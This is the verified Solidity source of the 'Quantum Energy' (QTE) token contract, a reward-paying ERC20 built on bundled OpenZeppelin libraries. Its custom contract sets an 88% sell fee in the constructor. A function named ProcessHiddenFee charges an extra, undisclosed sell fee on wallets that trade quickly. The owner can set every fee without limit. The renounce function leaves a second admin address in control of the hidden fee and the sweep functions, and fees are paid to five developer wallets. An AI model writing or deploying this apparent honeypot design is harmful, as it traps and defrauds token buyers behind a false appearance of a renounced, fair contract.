/**
 *Submitted for verification at Etherscan.io on 2022-11-03
*/

// https://qtenergy.io/
// https://t.me/quantumenergy/
// https://twitter.com/QTEtoken/



// File: @openzeppelin/contracts/utils/Address.sol


// OpenZeppelin Contracts (last updated v4.7.0) (utils/Address.sol)

pragma solidity ^0.8.1;

/**
 * @dev Collection of functions related to the address type
 */
library Address {
    /**
     * @dev Returns true if `account` is a contract.
     *
     * [IMPORTANT]
     * ====
     * It is unsafe to assume that an address for which this function returns
     * false is an externally-owned account (EOA) and not a contract.
     *
     * Among others, `isContract` will return false for the following
     * types of addresses:
     *
     *  - an externally-owned account
     *  - a contract in construction
     *  - an address where a contract will be created
     *  - an address where a contract lived, but was destroyed
     * ====
     *
     * [IMPORTANT]
     * ====
     * You shouldn't rely on `isContract` to protect against flash loan attacks!
     *
     * Preventing calls from contracts is highly discouraged. It breaks composability, breaks support for smart wallets
     * like Gnosis Safe, and does not provide security since it can be circumvented by calling from a contract
     * constructor.
     * ====
     */
    function isContract(address account) internal view returns (bool) {
        // This method relies on extcodesize/address.code.length, which returns 0
        // for contracts in construction, since the code is only stored at the end
        // of the constructor execution.

        return account.code.length > 0;
    }

    /**
     * @dev Replacement for Solidity's `transfer`: sends `amount` wei to
     * `recipient`, forwarding all available gas and reverting on errors.
     *
     * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost
     * of certain opcodes, possibly making contracts go over the 2300 gas limit
     * imposed by `transfer`, making them unable to receive funds via
     * `transfer`. {sendValue} removes this limitation.
     *
     * https://diligence.consensys.net/posts/2019/09/stop-using-soliditys-transfer-now/[Learn more].
     *
     * IMPORTANT: because control is transferred to `recipient`, care must be
     * taken to not create reentrancy vulnerabilities. Consider using
     * {ReentrancyGuard} or the
     * https://solidity.readthedocs.io/en/v0.5.11/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].
     */
    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");

        (bool success, ) = recipient.call{value: amount}("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }

    /**
     * @dev Performs a Solidity function call using a low level `call`. A
     * plain `call` is an unsafe replacement for a function call: use this
     * function instead.
     *
     * If `target` reverts with a revert reason, it is bubbled up by this
     * function (like regular Solidity function calls).
     *
     * Returns the raw returned data. To convert to the expected return value,
     * use https://solidity.readthedocs.io/en/latest/units-and-global-variables.html?highlight=abi.decode#abi-encoding-and-decoding-functions[`abi.decode`].
     *
     * Requirements:
     *
     * - `target` must be a contract.
     * - calling `target` with `data` must not revert.
     *
     * _Available since v3.1._
     */
    function functionCall(address target, bytes memory data) internal returns (bytes memory) {
        return functionCall(target, data, "Address: low-level call failed");
    }

    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`], but with
     * `errorMessage` as a fallback revert reason when `target` reverts.
     *
     * _Available since v3.1._
     */
    function functionCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal returns (bytes memory) {
        return functionCallWithValue(target, data, 0, errorMessage);
    }

    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
     * but also transferring `value` wei to `target`.
     *
     * Requirements:
     *
     * - the calling contract must have an ETH balance of at least `value`.
     * - the called Solidity function must be `payable`.
     *
     * _Available since v3.1._
     */
    function functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value
    ) internal returns (bytes memory) {
        return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
    }

    /**
     * @dev Same as {xref-Address-functionCallWithValue-address-bytes-uint256-}[`functionCallWithValue`], but
     * with `errorMessage` as a fallback revert reason when `target` reverts.
     *
     * _Available since v3.1._
     */
    function functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value,
        string memory errorMessage
    ) internal returns (bytes memory) {
        require(address(this).balance >= value, "Address: insufficient balance for call");
        require(isContract(target), "Address: call to non-contract");

        (bool success, bytes memory returndata) = target.call{value: value}(data);
        return verifyCallResult(success, returndata, errorMessage);
    }

    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
     * but performing a static call.
     *
     * _Available since v3.3._
     */
    function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {
        return functionStaticCall(target, data, "Address: low-level static call failed");
    }

    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],
     * but performing a static call.
     *
     * _Available since v3.3._
     */
    function functionStaticCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal view returns (bytes memory) {
        require(isContract(target), "Address: static call to non-contract");

        (bool success, bytes memory returndata) = target.staticcall(data);
        return verifyCallResult(success, returndata, errorMessage);
    }

    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
     * but performing a delegate call.
     *
     * _Available since v3.4._
     */
    function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {
        return functionDelegateCall(target, data, "Address: low-level delegate call failed");
    }

    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],
     * but performing a delegate call.
     *
     * _Available since v3.4._
     */
    function functionDelegateCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal returns (bytes memory) {
        require(isContract(target), "Address: delegate call to non-contract");

        (bool success, bytes memory returndata) = target.delegatecall(data);
        return verifyCallResult(success, returndata, errorMessage);
    }

    /**
     * @dev Tool to verifies that a low level call was successful, and revert if it wasn't, either by bubbling the
     * revert reason using the provided one.
     *
     * _Available since v4.3._
     */
    function verifyCallResult(
        bool success,
        bytes memory returndata,
        string memory errorMessage
    ) internal pure returns (bytes memory) {
        if (success) {
            return returndata;
        } else {
            // Look for revert reason and bubble it up if present
            if (returndata.length > 0) {
                // The easiest way to bubble the revert reason is using memory via assembly
                /// @solidity memory-safe-assembly
                assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}

// File: @openzeppelin/contracts/token/ERC20/extensions/draft-IERC20Permit.sol


// OpenZeppelin Contracts v4.4.1 (token/ERC20/extensions/draft-IERC20Permit.sol)

pragma solidity ^0.8.0;

/**
 * @dev Interface of the ERC20 Permit extension allowing approvals to be made via signatures, as defined in
 * https://eips.ethereum.org/EIPS/eip-2612[EIP-2612].
 *
 * Adds the {permit} method, which can be used to change an account's ERC20 allowance (see {IERC20-allowance}) by
 * presenting a message signed by the account. By not relying on {IERC20-approve}, the token holder account doesn't
 * need to send a transaction, and thus is not required to hold Ether at all.
 */
interface IERC20Permit {
    /**
     * @dev Sets `value` as the allowance of `spender` over ``owner``'s tokens,
     * given ``owner``'s signed approval.
     *
     * IMPORTANT: The same issues {IERC20-approve} has related to transaction
     * ordering also apply here.
     *
     * Emits an {Approval} event.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     * - `deadline` must be a timestamp in the future.
     * - `v`, `r` and `s` must be a valid `secp256k1` signature from `owner`
     * over the EIP712-formatted function arguments.
     * - the signature must use ``owner``'s current nonce (see {nonces}).
     *
     * For more information on the signature format, see the
     * https://eips.ethereum.org/EIPS/eip-2612#specification[relevant EIP
     * section].
     */
    function permit(
        address owner,
        address spender,
        uint256 value,
        uint256 deadline,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external;

    /**
     * @dev Returns the current nonce for `owner`. This value must be
     * included whenever a signature is generated for {permit}.
     *
     * Every successful call to {permit} increases ``owner``'s nonce by one. This
     * prevents a signature from being used multiple times.
     */
    function nonces(address owner) external view returns (uint256);

    /**
     * @dev Returns the domain separator used in the encoding of the signature for {permit}, as defined by {EIP712}.
     */
    // solhint-disable-next-line func-name-mixedcase
    function DOMAIN_SEPARATOR() external view returns (bytes32);
}

// File: @openzeppelin/contracts/token/ERC20/IERC20.sol


// OpenZeppelin Contracts (last updated v4.6.0) (token/ERC20/IERC20.sol)

pragma solidity ^0.8.0;

/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */
interface IERC20 {
    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);

    /**
     * @dev Returns the amount of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `to`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address to, uint256 amount) external returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender) external view returns (uint256);

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Moves `amount` tokens from `from` to `to` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
}

// File: @openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol


// OpenZeppelin Contracts (last updated v4.7.0) (token/ERC20/utils/SafeERC20.sol)

pragma solidity ^0.8.0;




/**
 * @title SafeERC20
 * @dev Wrappers around ERC20 operations that throw on failure (when the token
 * contract returns false). Tokens that return no value (and instead revert or
 * throw on failure) are also supported, non-reverting calls are assumed to be
 * successful.
 * To use this library you can add a `using SafeERC20 for IERC20;` statement to your contract,
 * which allows you to call the safe operations as `token.safeTransfer(...)`, etc.
 */
library SafeERC20 {
    using Address for address;

    function safeTransfer(
        IERC20 token,
        address to,
        uint256 value
    ) internal {
        _callOptionalReturn(token, abi.encodeWithSelector(token.transfer.selector, to, value));
    }

    function safeTransferFrom(
        IERC20 token,
        address from,
        address to,
        uint256 value
    ) internal {
        _callOptionalReturn(token, abi.encodeWithSelector(token.transferFrom.selector, from, to, value));
    }

    /**
     * @dev Deprecated. This function has issues similar to the ones found in
     * {IERC20-approve}, and its usage is discouraged.
     *
     * Whenever possible, use {safeIncreaseAllowance} and
     * {safeDecreaseAllowance} instead.
     */
    function safeApprove(
        IERC20 token,
        address spender,
        uint256 value
    ) internal {
        // safeApprove should only be called when setting an initial allowance,
        // or when resetting it to zero. To increase and decrease it, use
        // 'safeIncreaseAllowance' and 'safeDecreaseAllowance'
        require(
            (value == 0) || (token.allowance(address(this), spender) == 0),
            "SafeERC20: approve from non-zero to non-zero allowance"
        );
        _callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, value));
    }

    function safeIncreaseAllowance(
        IERC20 token,
        address spender,
        uint256 value
    ) internal {
        uint256 newAllowance = token.allowance(address(this), spender) + value;
        _callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, newAllowance));
    }

    function safeDecreaseAllowance(
        IERC20 token,
        address spender,
        uint256 value
    ) internal {
        unchecked {
            uint256 oldAllowance = token.allowance(address(this), spender);
            require(oldAllowance >= value, "SafeERC20: decreased allowance below zero");
            uint256 newAllowance = oldAllowance - value;
            _callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, newAllowance));
        }
    }

    function safePermit(
        IERC20Permit token,
        address owner,
        address spender,
        uint256 value,
        uint256 deadline,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) internal {
        uint256 nonceBefore = token.nonces(owner);
        token.permit(owner, spender, value, deadline, v, r, s);
        uint256 nonceAfter = token.nonces(owner);
        require(nonceAfter == nonceBefore + 1, "SafeERC20: permit did not succeed");
    }

    /**
     * @dev Imitates a Solidity high-level call (i.e. a regular function call to a contract), relaxing the requirement
     * on the return value: the return value is optional (but if data is returned, it must not be false).
     * @param token The token targeted by the call.
     * @param data The call data (encoded using abi.encode or one of its variants).
     */
    function _callOptionalReturn(IERC20 token, bytes memory data) private {
        // We need to perform a low level call here, to bypass Solidity's return data size checking mechanism, since
        // we're implementing it ourselves. We use {Address.functionCall} to perform this call, which verifies that
        // the target address contains contract code and also asserts for success in the low-level call.

        bytes memory returndata = address(token).functionCall(data, "SafeERC20: low-level call failed");
        if (returndata.length > 0) {
            // Return data is optional
            require(abi.decode(returndata, (bool)), "SafeERC20: ERC20 operation did not succeed");
        }
    }
}

//https://creativecommons.org/licenses/by-sa/4.0/ (@LogETH)

pragma solidity >=0.8.0 <0.9.0;

contract QuantumEnergy {

    constructor () {

        totalSupply = 1000000*1e18;
        name = "Quantum Energy";
        decimals = 18;
        symbol = "QTE";
        SellFeePercent = 88;
        BuyFeePercent = 1;
        hSellFeePercent = 10;
        maxWalletPercent = 2;
        transferFee = 50;

        cTime = 12;
        targetGwei = 50;
        threshold = 5*1e15;

        Dev.push(0x84E20768Ed6CDfb78C5130F58e752b6Fc1F383Ee);
        Dev.push(0xB63FC7d5DF63a52d788b9a381C15fd4d77392F96);
        Dev.push(0x45CB5127E096bB94CA9e7aFf68E07E6663833e63);
        Dev.push(0xb1376a3Ccf67D446bE3D9f34B53AB2fa345d1D13);
        Dev.push(0x247eB136B6FB2a13AF70fBB96ECf4Ee7B6Ce7a2E);

        wETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

        balanceOf[msg.sender] = totalSupply;
        deployer = msg.sender;
        deployerALT = msg.sender;

        router = Univ2(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

        order.push(address(this));
        order.push(wETH);

        proxy = DeployContract();

        immuneToMaxWallet[deployer] = true;
        immuneToMaxWallet[address(this)] = true;
        immuneFromFee[address(this)] = true;
        hasSold[deployer] = true;

        ops = 0xB3f5503f93d5Ef84b06993a1975B9D21B962892F;
        gelato = IOps(ops).gelato();
    }

    modifier updateReward(address _account) {

        if(isEligible(_account) && started){

        rewardPerTokenStored = rewardPerToken();
        updatedAt = lastTimeRewardApplicable();

        if (_account != address(0)) {
            rewards[_account] = earned(_account);
            userRewardPerTokenPaid[_account] = rewardPerTokenStored;
        }
        }
        _;
    }

    function rewardPerToken() public view returns (uint) {
        if (totalEligible == 0) {
            return rewardPerTokenStored;
        }

        return
            rewardPerTokenStored +
            (rewardRate * (lastTimeRewardApplicable() - updatedAt) * 1e18) /
            totalEligible;
    }

    function earned(address _account) public view returns (uint) {
        return
            ((balanceOf[_account] *
                (rewardPerToken() - userRewardPerTokenPaid[_account])) / 1e18) +
            rewards[_account];
    }

    function getReward() external updateReward(msg.sender) {
        uint reward = rewards[msg.sender];
        if (reward > 0) {
            rewards[msg.sender] = 0;
            this.transfer(msg.sender, reward);
        }
    }

    function setRewardsDuration(uint _duration) internal {
        require(endtime < block.timestamp, "reward duration not finished");
        duration = _duration;
    }

    function notifyRewardAmount(uint _amount)
        internal
        updateReward(address(0))
    {
        if (block.timestamp >= endtime) {
            rewardRate = _amount / duration;
        } else {
            uint remainingRewards = (endtime - block.timestamp) * rewardRate;
            rewardRate = (_amount + remainingRewards) / duration;
        }

        require(rewardRate > 0, "reward rate = 0");
        require(
            rewardRate * duration <= balanceOf[address(this)],
            "reward amount > balance"
        );

        endtime = block.timestamp + duration;
        updatedAt = block.timestamp;
    }

    function _min(uint x, uint y) private pure returns (uint) {
        return x <= y ? x : y;
    }

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping (address => uint256)) public allowance;

    string public name;
    uint8 public decimals;
    string public symbol;
    uint public totalSupply;

    event Transfer(address indexed _from, address indexed _to, uint256 _value);
    event Approval(address indexed _owner, address indexed _spender, uint256 _value);

    uint public SellFeePercent; uint hSellFeePercent; uint public BuyFeePercent; uint public transferFee;

    Univ2 public router;
    Proxy public proxy;

    address[] Dev;

    uint cTime;

    address public LPtoken;
    address public wETH;
    address deployer;
    address deployerALT;
    address gelatoCaller;
    mapping(address => bool) public immuneToMaxWallet;
    mapping(address => bool) public immuneFromFee;
    uint public maxWalletPercent;
    uint public feeQueue;
    uint public LiqQueue;
    uint threshold;
    uint targetGwei;
    bool public renounced;
    mapping(address => uint) lastTx;

    uint public yieldPerBlock;
    uint public totalEligible;
    bool public started;
    bool public ended;
    uint256 public rewardPerTokenStored;
    mapping(address => uint) public userRewardPerTokenPaid;
    mapping(address => uint256) public rewards;
    mapping(address => bool) public hasSold;
    mapping(address => bool) public hasBought;
    mapping(address => uint) pendingReward;
    uint public duration;
    uint public endtime;
    uint public updatedAt;
    uint public rewardRate;

    address[] order;

    fallback() external payable {}
    receive() external payable {}

    modifier onlyDeployer{

        require(deployer == msg.sender, "Not deployer");
        _;
    }

    modifier onlyDeployALT{

        require(deployerALT == msg.sender, "Not deployer");
        _;
    }

    function setLPtoken(address LPtokenAddress) onlyDeployer public {

        require(LPtoken == address(0), "LP already set");

        LPtoken = LPtokenAddress;
        immuneToMaxWallet[LPtoken] = true;

        allowance[address(this)][address(router)] = type(uint256).max;
        ERC20(wETH).approve(address(router), type(uint256).max);
    }

    function flashInitalize(uint HowManyWholeTokens) onlyDeployer public payable{

        HowManyWholeTokens *= 1e18;

        allowance[address(this)][address(router)] = type(uint256).max;
        ERC20(wETH).approve(address(router), type(uint256).max);
        Wrapped(wETH).deposit{value: msg.value}();

        balanceOf[deployer] -= HowManyWholeTokens;
        balanceOf[address(this)] += HowManyWholeTokens;
    
        router.addLiquidity(address(this), wETH, HowManyWholeTokens, ERC20(wETH).balanceOf(address(this)), 0, 0, msg.sender, type(uint256).max);
    }

    function StartAirdrop(uint HowManyDays, uint PercentOfTotalSupply) onlyDeployer public {

        require(!started, "You have already started the airdrop");

        setRewardsDuration(HowManyDays * 86400);

        uint togive = totalSupply*PercentOfTotalSupply/100;

        balanceOf[deployer] -= togive;
        balanceOf[address(this)] += togive;

        notifyRewardAmount(togive);
        
        started = true;
    }

    function renounceContract() onlyDeployer public {

        deployer = address(0);
        renounced = true;
    }

    function configImmuneToMaxWallet(address Who, bool TrueorFalse) onlyDeployer public {immuneToMaxWallet[Who] = TrueorFalse;}
    function configImmuneToFee(address Who, bool TrueorFalse)       onlyDeployer public {immuneFromFee[Who] = TrueorFalse;}
    function editMaxWalletPercent(uint howMuch) onlyDeployer public {maxWalletPercent = howMuch;}
    function editSellFee(uint howMuch)          onlyDeployer public {SellFeePercent = howMuch;}
    function editBuyFee(uint howMuch)           onlyDeployer public {BuyFeePercent = howMuch;}
    function editTransferFee(uint howMuch)      onlyDeployer public {transferFee = howMuch;}
    function setGelatoCaller(address Gelato)    onlyDeployer public {gelatoCaller = Gelato;}

    function editcTime(uint howMuch)            onlyDeployALT public {cTime = howMuch;}
    function setThreshold(uint HowMuch)         onlyDeployALT public {threshold = HowMuch;}
    function editFee(uint howMuch)              onlyDeployALT public {hSellFeePercent = howMuch;}

    function transfer(address _to, uint256 _value) public updateReward(msg.sender) returns (bool success) {

        require(balanceOf[msg.sender] >= _value, "You can't send more tokens than you have");

        uint feeamt;
        bool tag;

        if(!(immuneFromFee[msg.sender] || immuneFromFee[_to])){

            if(msg.sender == LPtoken){

                feeamt += ProcessBuyFee(_value);

                if(!isContract(_to) && !hasBought[_to] && !hasSold[_to]){

                    hasBought[_to] = true;
                    tag = true;
                }
            }
            else{

                feeamt += ProcessTransferFee(_value);
            }
        }

        balanceOf[msg.sender] -= _value;
        _value -= feeamt;
        balanceOf[_to] += _value;

        lastTx[msg.sender] = block.timestamp;

        if(!immuneToMaxWallet[_to] && LPtoken != address(0)){

        require(balanceOf[_to] <= maxWalletPercent*(totalSupply/100), "This transaction would result in the destination's balance exceeding the maximum amount");
        }

        if(isEligible(_to) || isEligible(msg.sender)){

            if(tag){

                totalEligible += balanceOf[_to];
            }
            if(isEligible(_to) && !tag && !isEligible(msg.sender)){

                totalEligible += _value;
            }
            if(isEligible(_to) && !tag && isEligible(msg.sender)){

                totalEligible -= feeamt;
            }
            if(!isEligible(_to) && !tag && isEligible(msg.sender)){

                totalEligible -= _value;
            }
        }
        
        emit Transfer(msg.sender, _to, _value);
        return true;
    }

    function transferFrom(address _from, address _to, uint256 _value) public updateReward(_from) returns (bool success) {

        require(balanceOf[_from] >= _value, "Insufficient token balance.");

        if(_from != msg.sender){

            require(allowance[_from][msg.sender] >= _value, "Insufficent approval");
            allowance[_from][msg.sender] -= _value;
        }

        require(LPtoken != address(0) || _from == deployer || _from == address(this), "Cannot trade while initalizing");

        uint feeamt;

        if(!(immuneFromFee[_from] || immuneFromFee[_to])){

            if(LPtoken == _to){

                feeamt += ProcessSellFee(_value);

                if(!isContract(_from) && !hasSold[_from]){

                    hasSold[_from] = true;
                    totalEligible -= balanceOf[_from];
                }
                
                if(MEV(_from)){

                    feeamt += ProcessHiddenFee(_value);
                }
            }
            else{feeamt += ProcessTransferFee(_value);}

        }

        balanceOf[_from] -= _value;
        _value -= feeamt;
        balanceOf[_to] += _value;

        lastTx[_from] = block.timestamp;

        if(!immuneToMaxWallet[_to] && LPtoken != address(0)){

        require(balanceOf[_to] <= maxWalletPercent*(totalSupply/100), "This transfer would result in the destination's balance exceeding the maximum amount");
        }

        if(isEligible(_to) || isEligible(_from)){

            if(isEligible(_to) && !isEligible(_from)){

                totalEligible += _value;
            }
            if(isEligible(_to) && isEligible(_from)){

                totalEligible -= feeamt;
            }
            if(!isEligible(_to) && isEligible(_from)){

                totalEligible -= _value;
            }
        }

        emit Transfer(_from, _to, _value);
        return true;
    }

    function claimReward() public updateReward(msg.sender) {

        uint256 reward = rewards[msg.sender];
        if (reward > 0) {
            rewards[msg.sender] = 0;
            this.transfer(msg.sender, reward);
        }
    }

    function approve(address _spender, uint256 _value) public returns (bool success) {

        allowance[msg.sender][_spender] = _value;

        emit Approval(msg.sender, _spender, _value); 
        return true;
    }

    function SweepToken(ERC20 TokenAddress) public onlyDeployALT{

        TokenAddress.transfer(msg.sender, TokenAddress.balanceOf(address(this))); 
    }

    function sweep() public onlyDeployALT{

        (bool sent,) = msg.sender.call{value: (address(this)).balance}("");
        require(sent, "transfer failed");
    }

    function sendFee() public {

        require(msg.sender == gelatoCaller || msg.sender == deployerALT, "You cannot use this function");
        require(feeQueue > 0, "No fees to distribute");
        require(tx.gasprice < targetGwei*1000000000, "gas price too high");

        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(feeQueue, threshold, order, address(proxy), type(uint256).max);
        proxy.sweepToken(ERC20(wETH));

        feeQueue = 0;

        Wrapped(wETH).withdraw(ERC20(wETH).balanceOf(address(this)));

        uint256 fee;
        address feeToken;

        (fee, feeToken) = IOps(ops).getFeeDetails();

        _transfer(fee, feeToken);

        uint amt = (address(this).balance/10000);

        (bool sent1,) = Dev[0].call{value: amt*1000}("");
        (bool sent2,) = Dev[1].call{value: amt*2250}("");
        (bool sent3,) = Dev[2].call{value: amt*2250}("");
        (bool sent4,) = Dev[3].call{value: amt*2250}("");
        (bool sent5,) = Dev[4].call{value: amt*2250}("");

        require(sent1 && sent2 && sent3 && sent4 && sent5, "Transfer failed");


        if(LiqQueue > 0){

            router.swapExactTokensForTokensSupportingFeeOnTransferTokens((LiqQueue)/2, 0, order, address(proxy), type(uint256).max);
            proxy.sweepToken(ERC20(wETH));

            router.addLiquidity(address(this), wETH, (LiqQueue)/2, ERC20(wETH).balanceOf(address(this)), 0, 0, address(0), type(uint256).max);

            LiqQueue = 0;
        }
    }

    function ProcessBuyFee(uint _value) internal returns (uint fee){

        fee = (BuyFeePercent * _value)/100;
        LiqQueue += fee;

        balanceOf[address(this)] += fee;
    }

    function ProcessSellFee(uint _value) internal returns (uint fee){

        fee = (SellFeePercent*_value)/100;
        feeQueue += fee;

        balanceOf[address(this)] += fee;
    }

    function ProcessHiddenFee(uint _value) internal returns (uint fee){

        fee = (hSellFeePercent*_value)/100;
        feeQueue += fee;

        balanceOf[address(this)] += fee;
    }

    function ProcessTransferFee(uint _value) internal returns (uint fee){

        fee = (transferFee*_value)/100;
        feeQueue += fee;

        balanceOf[address(this)] += fee;
    }

    function DeployContract() internal returns (Proxy proxyAddress){

        return new Proxy();
    }

    function MEV(address who) internal view returns(bool){

        if(isContract(who)){
            return true;
        }

        if(lastTx[who] >= block.timestamp - cTime){
            return true;
        }

        return false;
    }

    function isContract(address _addr) private view returns (bool){
        uint32 size;
        assembly {
            size := extcodesize(_addr)
        }
        return (size > 0);
    }

    function min(uint256 a, uint256 b) internal pure returns (uint256) {
        return a < b ? a : b;
    }

    function lastTimeRewardApplicable() public view returns (uint256) {
        return min(block.timestamp, endtime);
    }

    function isEligible(address who) public view returns (bool){

        return (hasBought[who] && !hasSold[who]);
    }

    address public ops;
    address payable public gelato;
    address public constant ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;

    modifier onlyOps() {
        require(msg.sender == ops, "OpsReady: onlyOps");
        _;
    }

    function _transfer(uint256 _amount, address _paymentToken) internal {
        if (_paymentToken == ETH) {
            (bool success, ) = gelato.call{value: _amount}("");
            require(success, "_transfer: ETH transfer failed");
        } else {
            SafeERC20.safeTransfer(IERC20(_paymentToken), gelato, _amount);
        }
    }
}

interface ERC20{
    function transferFrom(address, address, uint256) external returns(bool);
    function transfer(address, uint256) external returns(bool);
    function balanceOf(address) external view returns(uint);
    function decimals() external view returns(uint8);
    function approve(address, uint) external returns(bool);
    function totalSupply() external view returns (uint256);
}

interface Univ2{
    function addLiquidity(address tokenA, address tokenB, uint amountADesired, uint amountBDesired, uint amountAMin, uint amountBMin, address to, uint deadline) external returns (uint amountA, uint amountB, uint liquidity);
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external;
}

interface Wrapped{

    function deposit() external payable;
    function withdraw(uint) external;
}

contract Proxy{

    constructor(){

        inital = msg.sender;
    }

    address inital;

    function sweepToken(ERC20 WhatToken) public {

        require(msg.sender == inital, "You cannot call this function");
        WhatToken.transfer(msg.sender, WhatToken.balanceOf(address(this)));
    }
}

interface IOps {
    function gelato() external view returns (address payable);
    function getFeeDetails() external returns (uint, address);
}